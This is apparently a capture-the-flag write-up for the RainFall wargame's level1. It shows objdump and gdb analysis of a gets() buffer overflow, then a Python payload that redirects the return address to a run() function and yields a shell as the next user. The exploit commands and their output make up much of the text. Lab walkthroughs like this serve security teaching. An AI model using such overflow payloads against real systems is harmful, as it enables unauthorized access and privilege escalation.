# Walkthrough

"After listing the files in my home directory, I noticed a binary file named 'level1'. I decided to retrieve more information about this file by using the 'objdump' command to extract the functions used in the binary.

```
level1@RainFall:~$ objdump -t ./level1  | grep .text
08048390 l    d  .text 00000000              .text
080483c0 l     F .text 00000000              __do_global_dtors_aux
08048420 l     F .text 00000000              frame_dummy
08048520 l     F .text 00000000              __do_global_ctors_aux
08048510 g     F .text 00000002              __libc_csu_fini
08048512 g     F .text 00000000              .hidden __i686.get_pc_thunk.bx
08048444 g     F .text 0000003c              run
080484a0 g     F .text 00000061              __libc_csu_init
08048390 g     F .text 00000000              _start
08048480 g     F .text 00000017              main
```

Next, I attempted to reverse-engineer the code using gdb.

```
   0x08048480 <+0>: push   ebp
   0x08048481 <+1>: mov    ebp,esp
   0x08048483 <+3>: and    esp,0xfffffff0
   0x08048486 <+6>: sub    esp,0x50
   0x08048489 <+9>: lea    eax,[esp+0x10]
   0x0804848d <+13>: mov    DWORD PTR [esp],eax
   0x08048490 <+16>: call   0x8048340 <gets@plt>
   0x08048495 <+21>: leave  
   0x08048496 <+22>: ret  
```

"After carefully analyzing the code, I discovered a vulnerability in the gets() function. This function does not specify a limit on the amount of data that can be read, which makes it prone to buffer overflow attacks. As a result, it can overwrite other contents of the stack, such as the return value of the main() function.

```
=>   0x804848d <main+13>: mov    DWORD PTR [esp],eax
     0x8048490 <main+16>: call   0x8048340 <gets@plt>
     0x8048495 <main+21>: leave  
     0x8048496 <main+22>: ret    
     0x8048497: nop
┌─────────────────────────────────────────────────────────────────────────────┐
|   0xbffff5e0:   ┌-0xbffff816-┐   0x0000002f     0xbffff63c     0xb7fd0ff4   |
|                 └---  ESP ---┘                                              |
|   0xbffff5f0:   ┌-0x080484a0-┐   0x0804978c     0x00000001     0x08048321   |
|                 └-- Buffer --┘                                              |
|   0xbffff600:     0xb7fd13e4     0x00000016     0x0804978c     0x080484c1   |
|                                                                             |
|   0xbffff610:     0xffffffff     0xb7e5edc6     0xb7fd0ff4     0xb7e5ee55   |
|                                                                             |
|   0xbffff620:     0xb7fed280     0x00000000     0x080484a9     0xb7fd0ff4   |
|                                                                             |
|   0xbffff630:     0x080484a0     0x00000000   ┌-0x00000000-┐ ┌-0xb7e454d3-┐ |
|                                               └---  EBP ---┘ └-   Return  ┘ |
|   0xbffff640:     0x00000001     0xbffff6d4     0xbffff6dc     0xb7fdc858   |
└─────────────────────────────────────────────────────────────────────────────┘ 
    esp            0xbffff5e0 0xbffff5e0
    ebp            0xbffff638 0xbffff638
    eax            0xbffff5f0 -1073744400
```

I realized that I could exploit this vulnerability to change the return value of the main() function to point to the run() function. Once this is done, I could execute the /bin/sh command by using the system() function. This would allow me to gain unauthorized access to the system and potentially perform malicious actions."

Before proceeding, it is necessary to calculate the offset between the address of the buffer and the address of the $ebp register.
```
>>> 0xbffff638 - 0xbffff5f0
72 // and add 4 to pass the $ebp 
```
Since the return address of the function is located at $ebp + 4, we can fill the buffer with random data until we reach the address of $ebp. Once we have reached this point, we can change the value located at $ebp + 4 to the address of the run() function. By doing this, we can ensure that the program returns to the run() function after the main() function has executed.

To accomplish this task, I created a string using `Python`:
```
level1@RainFall:~$ python2 -c 'print("A" * 76 + "\x08\x04\x84\x44"[::-1])' > /tmp/flag

=> 0x8048495 <main+21>:	leave  
   0x8048496 <main+22>:	ret    
   0x8048497:	nop
   0x8048498:	nop
   0x8048499:	nop

0xbffff5e0:	0xbffff5f0	0x0000002f	0xbffff63c	0xb7fd0ff4
0xbffff5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff600:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff610:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff620:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff630:	0x41414141	0x41414141	0x41414141	0x08048444
0xbffff640:	0x00000000	0xbffff6d4	0xbffff6dc	0xb7fdc858

esp            0xbffff5e0	0xbffff5e0
ebp            0xbffff638	0xbffff638
eax            0xbffff5f0	-1073744400
```

After generating the string, I used it directly with the level1 binary. By passing this string as input to the binary, the buffer overflow vulnerability was exploited, and the return address of the function was overwritten with the address of the run() function.

```
level1@RainFall:~$ python2 -c 'print("A" * 76 + "\x08\x04\x84\x44"[::-1])' > /tmp/flag
level1@RainFall:~$ cat /tmp/flag - | ./level1 
Good... Wait what?
whoami
level2
cd ..
cd level2
ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
``` 

I used the command `cat /tmp/flag - | ./level1` to execute the level1 binary and retrieve the contents of the flag file. The - symbol was added to keep the pipe open, as the level1 program takes its input from the output of the previous command in the pipeline. Without the dash, the input would be closed once the level1 program finished executing, preventing further input. By using the dash, the cat command continues to read from the input after reading the contents of the flag file.